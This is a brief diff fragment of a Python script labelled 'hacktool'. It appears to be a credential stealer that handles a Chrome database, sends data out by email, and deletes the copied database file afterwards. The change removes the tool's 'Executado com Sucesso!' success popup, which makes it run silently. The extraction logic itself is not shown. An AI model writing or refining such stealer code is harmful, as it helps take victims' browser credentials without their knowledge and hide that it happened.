@@ -94,8 +94,6 @@ if __name__ == '__main__':
     vb.send_email()
     cursor.close()
     connect.close()
-    
-messagebox.showinfo(title='hacktool', message='Executado com Sucesso!')
 
 if os.path.exists(chromedb):
     os.remove(chromedb)
